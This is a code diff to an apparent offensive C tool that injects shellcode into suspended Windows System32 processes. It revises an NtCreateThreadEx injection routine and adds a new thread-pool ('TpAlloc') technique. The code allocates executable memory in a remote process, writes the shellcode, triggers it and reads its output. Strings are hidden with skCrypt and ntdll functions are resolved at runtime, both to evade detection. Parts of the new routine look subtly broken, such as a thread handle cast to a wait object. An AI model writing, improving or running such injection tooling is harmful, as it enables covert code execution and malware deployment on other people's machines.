@@ -106,8 +106,6 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 	LPVOID remoteBuffer = NULL;
 
-
-
 	char processPath[MAX_PATH];
 	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);
 
@@ -159,19 +157,19 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 	}
 	printf(skCrypt("[+] Shellcode written successfully\n"));
 	
-	HANDLE hThread = NULL;
+	HANDLE hThread = pi.hThread;
 
 	status = NtCreateThreadEx(
 		&hThread,
 		THREAD_ALL_ACCESS,
-		&oa, 
+		NULL,
 		pi.hProcess,
-		(LPTHREAD_START_ROUTINE)remoteBuffer,
 		remoteBuffer,
+		NULL,
 		FALSE,
-		NULL,
-		NULL,
-		NULL,
+		0,
+		0,
+		0,
 		NULL
 	);
 	if (status != STATUS_SUCCESS) {
@@ -187,7 +185,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 	}
 	printf(skCrypt("[+] Remote thread created successfully\n"));
 
-	status = NtResumeThread(hThread, NULL);
+	status = NtResumeThread(pi.hThread, NULL);
 	if (status != STATUS_SUCCESS) {
 		printf(skCrypt("[-] Failed to resume thread\n"));
 		CloseHandle(pi.hProcess);
@@ -204,7 +202,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 		LARGE_INTEGER timeout;
 		timeout.QuadPart = INFINITE;
 
-		status = NtWaitForSingleObject(hThread, FALSE, NULL);
+		status = NtWaitForSingleObject(hThread, FALSE, &timeout);
 
 		printf(skCrypt("[+] Thread finished successfully\n"));
 		printf(skCrypt("[+] Shellcode executed successfully\n"));
@@ -629,12 +627,223 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 	
 }
 
+BOOL InjectTpAlloc(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
+	
+	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtAllocateVirtualMemory"));
+	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWriteVirtualMemory"));
+	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtProtectVirtualMemory"));
+	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
+	_TpAllocWait TpAllocWait = (_TpAllocWait)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("TpAllocWait"));
+	_TpSetWait TpSetWait = (_TpSetWait)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("TpSetWait"));
+	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
+	_NtAssociateWaitCompletionPacket NtAssociateWaitCompletionPacket = (_NtAssociateWaitCompletionPacket)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtAssociateWaitCompletionPacket"));
+
+
+	NTSTATUS status = STATUS_SUCCESS;
+	HANDLE hReadPipe, hWritePipe;
+	SECURITY_ATTRIBUTES saAttr;
+
+	// Set the bInheritHandle flag so pipe handles are inherited.
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;
+	saAttr.lpSecurityDescriptor = NULL;
+
+	if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
+		printf(skCrypt("[-] Failed to create pipe\n"));
+		return FALSE;
+	}
+
+	if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
+		printf(skCrypt("[-] Failed to set handle information\n"));
+		return FALSE;
+	}
+
+	printf(skCrypt("[+] Pipe created successfully\n"));
+
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+
+	ZeroMemory(&si, sizeof(si));
+
+	si.cb = sizeof(si);
+	si.hStdError = hWritePipe;
+	si.hStdOutput = hWritePipe;
+	si.dwFlags |= STARTF_USESTDHANDLES;
+
+	ZeroMemory(&pi, sizeof(pi));
+	LPVOID remoteBuffer = NULL;
+
+	char processPath[MAX_PATH];
+	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);
+
+	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
+		printf(skCrypt("[-] Failed to create process\n"));
+		CloseHandle(hReadPipe);
+		CloseHandle(hWritePipe);
+
+		return FALSE;
+	}
+
+	printf(skCrypt("[+] Process created successfully\n"));
+
+	// NtAllocateVirutalMemory
+	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (status != STATUS_SUCCESS) {
+		printf(skCrypt("[-] Failed to allocate memory in remote process\n"));
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		CloseHandle(hReadPipe);
+		CloseHandle(hWritePipe);
+
+		return FALSE;
+	}
+	printf(skCrypt("[+] Memory allocated successfully\n"));
+
+	DWORD oldProtect;
+	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG)&shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+	if (status != STATUS_SUCCESS) {
+		printf(skCrypt("[-] Failed to change memory protection\n"));
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		CloseHandle(hReadPipe);
+		CloseHandle(hWritePipe);
+
+		return FALSE;
+	}
+	printf(skCrypt("[+] Memory protection changed successfully\n"));
+
+	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
+	if (status != STATUS_SUCCESS) {
+		printf(skCrypt("[-] Failed to write shellcode to remote process\n"));
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		CloseHandle(hReadPipe);
+		CloseHandle(hWritePipe);
+
+		return FALSE;
+	}
+	printf(skCrypt("[+] Shellcode written successfully\n"));
+	
+	// Create an event
+	HANDLE c = CreateEventA(NULL, FALSE, FALSE, "MyEvent");
+	if (c == NULL) {
+		printf(skCrypt("[-] Failed to create event\n"));
+		printf(skCrypt("[-] Error code: %d\n"), GetLastError());
+		return FALSE;
+	}
+	printf(skCrypt("[+] Event created successfully\n"));
+
+	status = NtResumeThread(pi.hThread, NULL);
+	if (status != STATUS_SUCCESS) {
+		printf(skCrypt("[-] Failed to resume thread\n"));
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		CloseHandle(hReadPipe);
+		CloseHandle(hWritePipe);
+
+		return FALSE;
+	}
+	printf(skCrypt("[+] Thread resumed successfully\n"));
+
+	// Allocate a thread pool wait object
+	TP_WAIT* pWait = (TP_WAIT*)&pi.hThread;
+	status = TpAllocWait(
+		&pWait,
+		(pTP_WAIT_CALLBACK)remoteBuffer,
+		NULL,
+		NULL
+	);
+
+	if (status != STATUS_SUCCESS) {
+		printf(skCrypt("[-] Failed TpAllocWait()\n"));
+		printf(skCrypt("[-] Error code: %x\n"), status);
+		printf(skCrypt("[-] Last Error: %d\n"), GetLastError());
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		CloseHandle(hReadPipe);
+		CloseHandle(hWritePipe);
+
+		return FALSE;
+	}
+	printf(skCrypt("[+] Thread pool wait allocated successfully\n"));
+
+	// Set the wait object for the thread pool wait object
+	SetThreadpoolWait(pWait, c, NULL);
+	printf(skCrypt("[+] Wait object set for thread pool wait\n"));
+
+	// Wait for the callback function to be called
+	WaitForThreadpoolWaitCallbacks(pWait, FALSE);
+	printf(skCrypt("[+] Waited for thread pool wait callbacks\n"));
+
+	// Set the event
+	SetEvent(c);
+
+	if(c != NULL && pi.hThread != NULL) {
+		printf(skCrypt("[+] Event set successfully\n"));
+		LARGE_INTEGER timeout;
+		timeout.QuadPart = INFINITE;
+
+		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);
+
+		printf(skCrypt("[+] Thread finished successfully\n"));
+		printf(skCrypt("[+] Shellcode executed successfully\n"));
+
+		CloseHandle(hWritePipe);
+
+		DWORD dwRead;
+		CHAR chBuf[MAX_PATH];
+		BOOL bSuccess = FALSE;
+		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+		CHAR *output = (CHAR*)malloc(1);
+		if (output == NULL) {
+			printf(skCrypt("[-] Failed to allocate memory\n"));
+			return FALSE;
+		}
+		output[0] = '\0';
+
+		for (;;) {
+			bSuccess = ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
+			if (!bSuccess || dwRead == 0) {
+				printf(skCrypt("[-] Failed to read pipe\n"));
+				break;
+			} 
+			chBuf[dwRead] = '\0';
+			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
+			if (new_output == NULL) {
+				printf(skCrypt("[-] Failed to allocate memory\n"));
+				free(output);
+				return FALSE;
+			}
+			output = new_output;
+			strncat(output, chBuf, dwRead);
+		}
+		output[strlen(output)] = '\0';
+		printf(skCrypt("[+] Shellcode Output:\n%s\n"), output);
+		free(output);
+	} else {
+		printf(skCrypt("[-] Failed to set event\n"));
+		printf(skCrypt("[-] Error code: %d\n"), GetLastError());
+		return FALSE;
+	
+	}
+
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	CloseHandle(hReadPipe);
+	CloseHandle(hWritePipe);
+
+	return TRUE;	
+
+}
+
 VOID PrintUsage() {
 	printf(skCrypt("Usage: interactive-execute-shellcode.exe --technique <technique> --process <process> --shellcode <shellcode>\n"));
 	printf(skCrypt("Techniques:\n"));
 	printf(skCrypt("\tThreadHijacking\n"));
 	printf(skCrypt("\tNtCreateThreadEx\n"));
 	printf(skCrypt("\tNtMapViewOfSection\n"));
+	printf(skCrypt("\tTpAlloc\n"));
 
 }
 
@@ -697,6 +906,17 @@ int main(int argc, char** argv) {
 					}
 					return 0;
 
+				} 
+				else if (strcmp(argv[i + 1], skCrypt("TpAlloc")) == 0) {
+					// NtMapViewOfSection
+					ParseArguments(argc, argv, processName, shellcodeName);
+					if (!ReadShellcodeFile(shellcodeName, &shellcode, &shellcodeSize)) {
+						return 1;
+					}
+					if(!InjectTpAlloc(processName, shellcode, shellcodeSize)) {
+						return 1;
+					}
+					return 0;
 				}
 				else {
 					printf(skCrypt("[-] Invalid technique\n"));
